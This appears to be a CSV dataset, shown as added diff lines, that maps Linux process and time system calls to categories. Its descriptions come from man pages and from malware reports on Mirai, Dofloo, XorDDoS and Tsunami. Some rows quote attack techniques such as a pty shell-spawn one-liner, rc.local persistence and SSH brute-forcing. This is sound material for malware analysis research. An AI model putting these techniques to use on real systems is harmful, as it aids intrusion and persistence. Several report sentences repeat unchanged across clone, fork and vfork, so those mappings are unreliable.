+PROC,PROC_EXE,Dofloo.Mal,clone(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
+PROC,PROC_EXE,Mirai.Mal,clone(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
+PROC,PROC_EXE,Xorddos.Micro,clone(),perform,method involves running a bash script that performs the following activities via the command line:
+PROC,PROC_EXE,Tsunami.Cado,clone(),install,And the kinsing malware itself was installed at /etc/kinsing
+PROC,PROC_EXE,Tsunami.Aquasec,clone(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
+PROC,PROC_EXE,Xorddos.Micro,clone(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
+PROC,PROC_EXE,man,exec(),execute,executes the program referred to by pathname
+PROC,PROC_EXE,man,exec(),replace,replaces the current process image with a new process image.
+PROC,PROC_EXE,man,execve(),execute,execute program
+PROC,PROC_EXE,Dofloo.Syscall,execve(),use,the malware constructs a shell command and then uses the system function to execute them
+PROC,PROC_EXE,Dofloo.Mal,execve(),call,This is the function to be called when performing DoS by HTTP
+PROC,PROC_EXE,Xorddos.Intezer,execve(),spawn,"In the new spawned shell, the malware executes python -c “import pty;pty.spawn(‘/bin/sh’)” to get a pseudo-terminal (pty) interface."
+PROC,PROC_EXE,Dofloo.Syscall,execve(),fork,The process then forks itself and breaks away from its parent by calling setsid(..).
+PROC,PROC_EXE,Xorddos.Intezer,execve(),perform,The JSESSIONID value holds the command ID for the job the C2 wants the malware to perform.
+PROC,PROC_EXE,Dofloo.Security,execve(),install,"we saw that an attacker was able to exploit CVE-2019-3396 to infect machines with the AESDDoS botnet malware.” reads the analysis published by Trend Micro. “A shell command was remotely executed to download and execute a malicious shell script (Trojan.SH.LODEX.J), which in turn downloaded another shell script (Trojan.SH.DOGOLOAD.J) that finally installed the AESDDoS botnet malware on the affected system."
+PROC,PROC_EXE,Dofloo.Syscall,execve(),add,Persistence is achieved by the malware by adding to /etc/rc.local
+PROC,PROC_EXE,Mirai.Mal,execve(),start,bind it to the specific port (not random) TCP/48101 from localhost IP address 127.0.0.1 and then starting to listen to the incoming connection:
+PROC,PROC_EXE,man,execveat(),execute,execute program relative to a directory file descriptor
+PROC,PROC_EXE,man,fork(),create,create a child process
+PROC,PROC_EXE,Mirai.Impera,fork(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
+PROC,PROC_EXE,Xorddos.Intezer,fork(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
+PROC,PROC_EXE,Dofloo.Mal,fork(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
+PROC,PROC_EXE,Mirai.Mal,fork(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
+PROC,PROC_EXE,Xorddos.Micro,fork(),perform,method involves running a bash script that performs the following activities via the command line:
+PROC,PROC_EXE,Tsunami.Cado,fork(),install,And the kinsing malware itself was installed at /etc/kinsing
+PROC,PROC_EXE,Tsunami.Aquasec,fork(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
+PROC,PROC_EXE,Xorddos.Micro,fork(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
+PROC,PROC_EXE,man,personality(),set,set the process execution domain
+PROC,PROC_EXE,man,restart_syscall(),restart,restart a system call after interruption by a stop signal
+PROC,PROC_EXE,man,unshare(),disassociate,disassociate parts of the process execution context
+PROC,PROC_EXE,man,vfork(),create,create a child process and block parent
+PROC,PROC_EXE,Mirai.Impera,vfork(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
+PROC,PROC_EXE,Xorddos.Intezer,vfork(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
+PROC,PROC_EXE,Dofloo.Mal,vfork(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
+PROC,PROC_EXE,Mirai.Mal,vfork(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
+PROC,PROC_EXE,Xorddos.Micro,vfork(),perform,method involves running a bash script that performs the following activities via the command line:
+PROC,PROC_EXE,Tsunami.Cado,vfork(),install,And the kinsing malware itself was installed at /etc/kinsing
+PROC,PROC_EXE,Tsunami.Aquasec,vfork(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
+PROC,PROC_EXE,Xorddos.Micro,vfork(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
+PROC,PROC_GET,man,getrandom(),obtain,obtain a series of random bytes
+PROC,PROC_GET,man,query_module(),query,query the kernel for various bits pertaining to modules
+PROC,PROC_GET,man,rt_sigreturn(),return,return from signal handler and cleanup stack frame
+PROC,PROC_GET,man,sched_rr_get_interval(),get,get the SCHED_RR interval for the named process
+PROC,PROC_GET,man,sigreturn(),return,return from signal handler and cleanup stack frame
+PROC,PROC_GET,man,timer_getoverrun(),get,get overrun count for a POSIX per
+PROC,PROC_KILL,man,exit(),terminate,terminate the calling process
+PROC,PROC_KILL,man,exit_group(),exit,exit all threads in a process
+PROC,PROC_KILL,Tsunami.Trend,exit_group(),kill,Kill all current packeting.
+PROC,PROC_KILL,Tsunami.Aquasec,exit_group(),end,"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends."
+PROC,PROC_KILL,man,kill(),send,send signal to a process
+PROC,PROC_KILL,Tsunami.Unit42,kill(),kill,"It then kills all Telnet and SSH related processes, and connects with a C2 server to receive further commands."
+PROC,PROC_KILL,Tsunami.Aquasec,kill(),end,"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends."
+PROC,PROC_KILL,man,tgkill(),send,send a signal to a thread
+PROC,PROC_KILL,man,tkill(),send,send a signal to a thread
+PROC,PROC_LOAD,man,delete_module(),unload,unload a kernel module
+PROC,PROC_LOAD,man,finit_module(),load,load a kernel module
+PROC,PROC_LOAD,man,init_module(),load,load a kernel module
+PROC,PROC_LOAD,man,uselib(),shared,load shared library
+PROC,PROC_MEM,man,get_mempolicy(),retrieve,retrieve NUMA memory policy for a thread
+PROC,PROC_MEM,man,mbind(),set,set memory policy for a memory range
+PROC,PROC_MEM,man,mlock(),lock,lock and unlock memory
+PROC,PROC_MEM,man,mlock2(),lock,lock and unlock memory
+PROC,PROC_MEM,man,mlockall(),lock,lock and unlock memory
+PROC,PROC_MEM,man,munlock(),lock,lock and unlock memory
+PROC,PROC_MEM,man,munlockall(),lock,lock and unlock memory
+PROC,PROC_MEM,man,pkey_mprotect(),set,set protection on a region of memory
+PROC,PROC_MEM,man,set_mempolicy(),set,set default NUMA memory policy for a thread and its children
+PROC,PROC_MEM,man,shmat(),attach,shmat() attaches the shared memory segment identified by shmid to the address space of the calling process.
+PROC,PROC_MEM,man,shmdt(),attach,shmat() attaches the shared memory segment identified by shmid to the address space of the calling process.
+PROC,PROC_MEM,man,shmget(),allocate,allocates a shared memory segment
+PROC,PROC_OTHER,man,arch_prctl(),set,set architecture-specific thread state
+PROC,PROC_OTHER,man,bdflush(),start,"start, flush, or tune buffer"
+PROC,PROC_OTHER,man,bpf(),perform,perform a command on an extended BPF map or program
+PROC,PROC_OTHER,man,brk(),change,change data segment size
+PROC,PROC_OTHER,man,create_module(),create,create a loadable module entry
+PROC,PROC_OTHER,man,futex(),wait,"The futex() system call provides a method for a program to wait for a value at a given address to change, and a method to wake up anyone waiting on a particular address"
+PROC,PROC_OTHER,man,futex(),wake,"The futex() system call provides a method for a program to wait for a value at a given address to change, and a method to wake up anyone waiting on a particular address"
+PROC,PROC_OTHER,man,kcmp(),compare,compare two processes to determine if they share a kernel resource
+PROC,PROC_OTHER,man,migrate_pages(),move,move all pages in a process to another set of nodes
+PROC,PROC_OTHER,man,mincore(),determine,determine whether pages are resident in memory
+PROC,PROC_OTHER,man,move_pages(),move,move individual pages of a process to another node
+PROC,PROC_OTHER,man,mprotect(),set,set protection on a region of memory
+PROC,PROC_OTHER,man,mremap(),remap,remap a virtual memory address
+PROC,PROC_OTHER,man,nanosleep(),suspend,nanosleep() suspends the execution
+PROC,PROC_OTHER,Xorddos.Intezer,nanosleep(),sleep,The malware sleeps and tries to obtain the lock on the file again when it wakes up.
+PROC,PROC_OTHER,man,pkey_alloc(),allocate,allocate or free a protection key
+PROC,PROC_OTHER,man,pkey_free(),allocate,allocate or free a protection key
+PROC,PROC_OTHER,man,process_vm_readv(),transfer,transfer data between process address spaces
+PROC,PROC_OTHER,man,process_vm_writev(),transfer,transfer data between process address spaces
+PROC,PROC_OTHER,man,sched_yield(),yield,yield the processor
+PROC,PROC_OTHER,man,seccomp(),operate,operate on Secure Computing state of the process
+PROC,PROC_OTHER,man,set_robust_list(),set,set list of robust futexes
+PROC,PROC_OTHER,man,set_thread_area(),set,set a thread local storage (TLS) area
+PROC,PROC_OTHER,man,set_tid_address(),set,set pointer to thread ID
+PROC,PROC_OTHER,man,timer_create(),create,create a POSIX per
+PROC,PROC_OTHER,man,timer_delete(),delete,delete a POSIX per
+PROC,PROC_OTHER,man,timer_gettime(),fetch,arm/disarm and fetch state of POSIX per
+PROC,PROC_OTHER,man,vm86(),enter,enter virtual 8086 mode
+PROC,PROC_SET,man,alarm(),set,set an alarm clock for delivery of a signal
+PROC,PROC_SET,man,capget(),get,set/get capabilities of thread(s)
+PROC,PROC_SET,man,capset(),set,set/get capabilities of thread(s)
+PROC,PROC_SET,man,get_robust_list(),get,get/set list of robust futexes
+PROC,PROC_SET,man,getitimer(),get,get or set value of an interval timer
+PROC,PROC_SET,man,ioprio_get(),get,get/set I/O scheduling class and priority
+PROC,PROC_SET,man,ioprio_set(),set,get/set I/O scheduling class and priority
+PROC,PROC_SET,man,sched_getaffinity(),get,set and get a thread's CPU affinity mask
+PROC,PROC_SET,man,sched_getattr(),get,set and get scheduling policy and attributes
+PROC,PROC_SET,man,sched_getparam(),get,set and get scheduling parameters
+PROC,PROC_SET,man,sched_getscheduler(),get,set and get scheduling policy/parameters
+PROC,PROC_SET,man,sched_setaffinity(),set,set and get a thread's CPU affinity mask
+PROC,PROC_SET,man,sched_setattr(),set,set and get scheduling policy and attributes
+PROC,PROC_SET,man,sched_setparam(),set,set and get scheduling parameters
+PROC,PROC_SET,man,sched_setscheduler(),set,set and get scheduling policy/parameters
+PROC,PROC_SET,man,setitimer(),set,get or set value of an interval timer
+PROC,PROC_SET,man,setns(),reassociate,reassociate thread with a namespace
+PROC,PROC_SET,man,sigaltstack(),set,set and/or get signal stack context
+PROC,PROC_SET,man,sigaltstack(),get,set and/or get signal stack context
+PROC,PROC_SET,man,timer_settime(),fetch,arm/disarm and fetch state of POSIX per
+PROC,PROC_TRACE,man,ptrace(),trace,process trace
+PROC,PROC_TRACE,man,ptrace(),observe,"The ptrace() system call provides a means by which one process (the ""tracer"") may observe and control the execution of another process"
+PROC,PROC_TRACE,man,ptrace(),control,"The ptrace() system call provides a means by which one process (the ""tracer"") may observe and control the execution of another process"
+PROC,PROC_TRACE,man,ptrace(),examine,examine and change the tracee's memory and registers.
+PROC,PROC_TRACE,man,ptrace(),change,examine and change the tracee's memory and registers.
+PROC,PROC_WAIT,man,idle(),make,make process 0 idle
+PROC,PROC_WAIT,man,pause(),wait,wait for signal
+PROC,PROC_WAIT,man,rt_sigsuspend(),wait,wait for a signal
+PROC,PROC_WAIT,man,rt_sigtimedwait(),wait,synchronously wait for queued signals
+PROC,PROC_WAIT,man,sigsuspend(),wait,wait for a signal
+PROC,PROC_WAIT,man,wait4(),wait,"wait for process to change state, BSD style"
+PROC,PROC_WAIT,man,waitid(),wait,wait for process to change state
+PROC,PROC_WAIT,man,waitpid(),wait,wait for process to change state
+TIME,TIME_GET,man,gettimeofday(),get,get / set time
+TIME,TIME_GET,man,time(),get,get time in seconds
+TIME,TIME_GET,man,times(),get,get process times
+TIME,TIME_SET,man,settimeofday(),set,get / set time
+TIME,TIME_SET,man,stime(),set,set time
